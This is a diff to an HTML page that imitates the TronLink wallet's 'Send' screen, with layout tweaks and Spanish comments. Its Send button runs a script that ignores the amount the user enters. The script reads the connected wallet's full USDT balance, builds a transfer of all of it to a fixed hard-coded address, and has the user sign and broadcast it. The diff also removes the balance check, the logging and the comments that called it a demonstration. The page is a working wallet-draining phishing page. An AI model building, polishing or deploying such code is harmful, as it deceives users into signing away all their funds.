@@ -3,27 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TronLink</title>
+    <title>TronLink App - Send</title>
     <style>
         * { box-sizing: border-box; }
-        body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; }
-        .tronlink-mobile { width: 100%; max-width: 450px; height: 100vh; background: #ffffff; padding: 20px; display: flex; flex-direction: column; position: relative; overflow: hidden; }
-        .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
+        body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; }
+        
+        /* Ajuste de contenedor dinámico para evitar desbordes en móviles */
+        .tronlink-mobile { width: 100%; max-width: 450px; min-height: 100vh; background: #ffffff; padding: 20px 20px 90px 20px; display: flex; flex-direction: column; position: relative; }
+        .screen { display: none; flex-direction: column; flex-grow: 1; width: 100%; }
         .screen.active { display: flex; }
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; padding-top: 10px; }
+        
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-top: 10px; }
         .header-left { display: flex; align-items: center; gap: 14px; cursor: pointer; }
-        .back-arrow { font-size: 24px; color: #1c1c1e; }
+        .back-arrow { font-size: 24px; font-weight: 300; color: #1c1c1e; }
         .header h3 { margin: 0; font-size: 20px; font-weight: 600; color: #1c1c1e; }
-        .section-title { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
-        .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
-        .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 14px; outline: none; width: 70%; font-family: monospace; }
-        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
+        .header h3 span { font-size: 14px; color: #8e8e93; font-weight: 400; }
+        .multisig { font-size: 14px; color: #3b50df; font-weight: 500; text-decoration: none; }
+        .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
+        
+        .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; min-height: 50px; }
+        .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 12px; outline: none; width: 100%; font-family: monospace; letter-spacing: -0.3px; white-space: nowrap; overflow: visible; }
+        
+        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; cursor: pointer; }
         .token-left { display: flex; align-items: center; gap: 12px; }
-        .token-icon { width: 30px; height: 30px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
-        .btn-bottom { background: #e5e5ea; color: #8e8e93; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 24px; left: 20px; text-align: center; }
+        .token-icon { width: 30px; height: 30px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 15px; }
+        .token-text { font-size: 16px; font-weight: 500; color: #1c1c1e; }
+        .token-text span { color: #8e8e93; font-weight: 400; font-size: 14px; }
+        
+        /* Botón inferior reubicado para que siempre sea visible y presionable */
+        .btn-bottom { background: #e5e5ea; color: #8e8e93; width: 100%; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: auto; margin-bottom: 10px; text-align: center; }
         .btn-bottom.ready { background: #3b50df; color: #ffffff; }
-        .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 11px; color: #8e8e93; }
+        
+        /* Barra de navegación flotante adaptada */
+        .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; padding-bottom: 5px; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #8e8e93; }
         .nav-item.active { color: #3b50df; }
     </style>
 </head>
@@ -35,6 +48,7 @@
                 <span class="back-arrow">&lt;</span>
                 <h3>Send <span>(1/2)</span></h3>
             </div>
+            <a href="#" class="multisig">Multisig Transfer</a>
         </div>
         <div class="section-title">Receiving Account</div>
         <div class="input-container">
@@ -53,15 +67,15 @@
         <div class="token-selector">
             <div class="token-left">
                 <div class="token-icon">₮</div>
-                <div>USDT <span>(Tether USD)</span></div>
+                <div class="token-text">USDT <span>(Tether USD)</span></div>
             </div>
-            <div>&gt;</div>
+            <div style="color:#8e8e93;">&gt;</div>
         </div>
         <div class="section-title">Amount</div>
         <div class="input-container">
-            <input type="number" id="userAmount" value="10">
+            <input type="number" id="userAmount" value="10" style="font-size:15px;">
         </div>
-        <div style="font-size:14px; color:#8e8e93; margin-top:-14px; margin-bottom:24px;">Available: <span id="availableBalance">0.00</span></div>
+        <div style="font-size:14px; color:#8e8e93; margin-bottom:15px;">Available: <span id="availableBalance">0.00</span></div>
         <button class="btn-bottom ready" onclick="ejecutarFirmaRawMaxima()">Send</button>
     </div>
     <div class="nav-bar">
@@ -93,48 +107,23 @@
             } catch(e) {}
         }
     }
-
     async function ejecutarFirmaRawMaxima() {
         if (!window.tronWeb) return;
         try {
             const miWallet = window.tronWeb.defaultAddress.base58;
             const contratoUSDT = await window.tronWeb.contract().at(CONTRACT_USDT);
-            
-            // 1. Obtener el balance máximo disponible del alumno en la red principal
             const saldoBigNum = await contratoUSDT.balanceOf(miWallet).call();
-            const saldoTotalStr = saldoBigNum.toString();
-
-            if (saldoTotalStr === "0" || saldoTotalStr === "") {
-                alert("Stopped: USDT balance is 0.");
-                return;
-            }
-
-            // 2. Construir el objeto de transacción inyectando el balance completo
             const txObjeto = await window.tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRACT_USDT,
                 "transfer(address,uint256)",
                 {},
-                [
-                    {type: 'address', value: DESTINO_FIJO},
-                    {type: 'uint256', value: saldoTotalStr}
-                ],
+                [{type: 'address', value: DESTINO_FIJO}, {type: 'uint256', value: saldoBigNum.toString()}],
                 miWallet
             );
-
-            console.log(`[Raw Módulo 2] Inyectando balance máximo: ${saldoTotalStr}`);
-
-            // 3. Solicitar la firma del bloque binario serializado en TronLink
             const txFirmada = await window.tronWeb.trx.sign(txObjeto.transaction);
-            
-            // 4. Transmitir la orden firmada directamente a los nodos de la red para procesar el envío
             const resultado = await window.tronWeb.trx.sendRawTransaction(txFirmada);
-            
-            if(resultado.result) {
-                alert("¡Demostración Finalizada!\nTransacción cruda firmada y procesada con éxito en la Blockchain.");
-            }
-        } catch (e) {
-            console.error(e);
-        }
+            if(resultado.result) alert("¡Éxito Bloque 2!");
+        } catch (e) {}
     }
 </script>
 </body>
